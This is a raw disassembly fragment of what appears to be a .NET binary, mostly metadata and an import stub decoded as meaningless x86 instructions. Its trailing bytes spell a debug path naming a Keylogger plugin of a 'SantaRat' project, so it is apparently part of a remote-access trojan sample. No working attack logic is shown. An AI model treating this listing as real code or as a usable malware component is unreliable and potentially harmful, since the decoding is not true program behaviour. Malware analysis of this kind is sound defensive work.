  403c95:	00 40 01             	add    %al,0x1(%eax)
  403c98:	17                   	pop    %ss
  403c99:	00 59 00             	add    %bl,0x0(%ecx)
  403c9c:	01 00                	add    %eax,(%eax)
  403c9e:	07                   	pop    %es
  403c9f:	01 19                	add    %ebx,(%ecx)
  403ca1:	00 72 00             	add    %dh,0x0(%edx)
  403ca4:	01 00                	add    %eax,(%eax)
  403ca6:	40                   	inc    %eax
  403ca7:	01 1b                	add    %ebx,(%ebx)
  403ca9:	00 7e 00             	add    %bh,0x0(%esi)
  403cac:	01 00                	add    %eax,(%eax)
  403cae:	00 01                	add    %al,(%ecx)
  403cb0:	1d 00 8f 00 01       	sbb    $0x1008f00,%eax
  403cb5:	00 00                	add    %al,(%eax)
  403cb7:	01 1f                	add    %ebx,(%edi)
  403cb9:	00 a1 00 01 00 00    	add    %ah,0x100(%ecx)
  403cbf:	01 21                	add    %esp,(%ecx)
  403cc1:	00 ad 00 01 00 04    	add    %ch,0x4000100(%ebp)
  403cc7:	80 00 00             	addb   $0x0,(%eax)
  403cca:	01 00                	add    %eax,(%eax)
  403ccc:	00 00                	add    %al,(%eax)
  403cce:	07                   	pop    %es
	...
  403cd7:	00 bb 00 00 00 04    	add    %bh,0x4000000(%ebx)
	...
  403ce5:	00 00                	add    %al,(%eax)
  403ce7:	00 4e 03             	add    %cl,0x3(%esi)
  403cea:	dd 04 00             	fldl   (%eax,%eax,1)
  403ced:	00 00                	add    %al,(%eax)
  403cef:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  403cfa:	00 00                	add    %al,(%eax)
  403cfc:	4e                   	dec    %esi
  403cfd:	03 ea                	add    %edx,%ebp
  403cff:	08 00                	or     %al,(%eax)
  403d01:	00 00                	add    %al,(%eax)
  403d03:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  403d0e:	00 00                	add    %al,(%eax)
  403d10:	4e                   	dec    %esi
  403d11:	03 f9                	add    %ecx,%edi
  403d13:	04 00                	add    $0x0,%al
  403d15:	00 00                	add    %al,(%eax)
  403d17:	00 00                	add    %al,(%eax)
  403d19:	00 00                	add    %al,(%eax)
  403d1b:	00 01                	add    %al,(%ecx)
  403d1d:	00 00                	add    %al,(%eax)
  403d1f:	00 4b 01             	add    %cl,0x1(%ebx)
  403d22:	00 00                	add    %al,(%eax)
  403d24:	06                   	push   %es
  403d25:	00 02                	add    %al,(%edx)
  403d27:	00 50 3d             	add    %dl,0x3d(%eax)
	...
  403d32:	00 00                	add    %al,(%eax)
  403d34:	66 3d 00 00          	cmp    $0x0,%ax
  403d38:	84 3d 00 00 00 00    	test   %bh,0x0
	...
  403d4e:	00 00                	add    %al,(%eax)
  403d50:	58                   	pop    %eax
  403d51:	3d 00 00 00 00       	cmp    $0x0,%eax
  403d56:	00 00                	add    %al,(%eax)
  403d58:	00 00                	add    %al,(%eax)
  403d5a:	5f                   	pop    %edi
  403d5b:	43                   	inc    %ebx
  403d5c:	6f                   	outsl  %ds:(%esi),(%dx)
  403d5d:	72 45                	jb     0x403da4
  403d5f:	78 65                	js     0x403dc6
  403d61:	4d                   	dec    %ebp
  403d62:	61                   	popa
  403d63:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  403d6a:	72 65                	jb     0x403dd1
  403d6c:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  403d70:	6c                   	insb   (%dx),%es:(%edi)
  403d71:	00 00                	add    %al,(%eax)
  403d73:	00 00                	add    %al,(%eax)
  403d75:	00 ff                	add    %bh,%bh
  403d77:	25 84 3d 40 00       	and    $0x403d84,%eax
	...
  403d84:	58                   	pop    %eax
  403d85:	3d 00 00 00 00       	cmp    $0x0,%eax
  403d8a:	00 00                	add    %al,(%eax)
  403d8c:	00 00                	add    %al,(%eax)
  403d8e:	00 00                	add    %al,(%eax)
  403d90:	01 6c 2c 62          	add    %ebp,0x62(%esp,%ebp,1)
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	02 00                	add    (%eax),%al
  403d9a:	00 00                	add    %al,(%eax)
  403d9c:	6e                   	outsb  %ds:(%esi),(%dx)
  403d9d:	00 00                	add    %al,(%eax)
  403d9f:	00 a8 3d 00 00 a8    	add    %ch,-0x57ffffc3(%eax)
  403da5:	1f                   	pop    %ds
  403da6:	00 00                	add    %al,(%eax)
  403da8:	52                   	push   %edx
  403da9:	53                   	push   %ebx
  403daa:	44                   	inc    %esp
  403dab:	53                   	push   %ebx
  403dac:	6f                   	outsl  %ds:(%esi),(%dx)
  403dad:	4d                   	dec    %ebp
  403dae:	3d 41 14 0b 21       	cmp    $0x210b1441,%eax
  403db3:	4c                   	dec    %esp
  403db4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403db5:	be 2f 9d b4 79       	mov    $0x79b49d2f,%esi
  403dba:	41                   	inc    %ecx
  403dbb:	64 01 00             	add    %eax,%fs:(%eax)
  403dbe:	00 00                	add    %al,(%eax)
  403dc0:	43                   	inc    %ebx
  403dc1:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
  403dc5:	65 72 73             	gs jb  0x403e3b
  403dc8:	5c                   	pop    %esp
  403dc9:	41                   	inc    %ecx
  403dca:	64 6d                	fs insl (%dx),%es:(%edi)
  403dcc:	69 6e 69 73 74 72 61 	imul   $0x61727473,0x69(%esi),%ebp
  403dd3:	74 6f                	je     0x403e44
  403dd5:	72 5c                	jb     0x403e33
  403dd7:	44                   	inc    %esp
  403dd8:	6f                   	outsl  %ds:(%esi),(%dx)
  403dd9:	77 6e                	ja     0x403e49
  403ddb:	6c                   	insb   (%dx),%es:(%edi)
  403ddc:	6f                   	outsl  %ds:(%esi),(%dx)
  403ddd:	61                   	popa
  403dde:	64 73 5c             	fs jae 0x403e3d
  403de1:	53                   	push   %ebx
  403de2:	61                   	popa
  403de3:	6e                   	outsb  %ds:(%esi),(%dx)
  403de4:	74 61                	je     0x403e47
  403de6:	52                   	push   %edx
  403de7:	61                   	popa
  403de8:	74 2d                	je     0x403e17
  403dea:	6d                   	insl   (%dx),%es:(%edi)
  403deb:	61                   	popa
  403dec:	69 6e 5c 42 69 6e 61 	imul   $0x616e6942,0x5c(%esi),%ebp
  403df3:	72 69                	jb     0x403e5e
  403df5:	65 73 5c             	gs jae 0x403e54
  403df8:	52                   	push   %edx
  403df9:	65 6c                	gs insb (%dx),%es:(%edi)
  403dfb:	65 61                	gs popa
  403dfd:	73 65                	jae    0x403e64
  403dff:	5c                   	pop    %esp
  403e00:	50                   	push   %eax
  403e01:	6c                   	insb   (%dx),%es:(%edi)
  403e02:	75 67                	jne    0x403e6b
  403e04:	69 6e 73 5c 4b 65 79 	imul   $0x79654b5c,0x73(%esi),%ebp
  403e0b:	6c                   	insb   (%dx),%es:(%edi)
  403e0c:	6f                   	outsl  %ds:(%esi),(%dx)
  403e0d:	67 67 65 72 2e       	addr16 addr16 gs jb 0x403e40
  403e12:	70 64                	jo     0x403e78
  403e14:	62 00                	bound  %eax,(%eax)
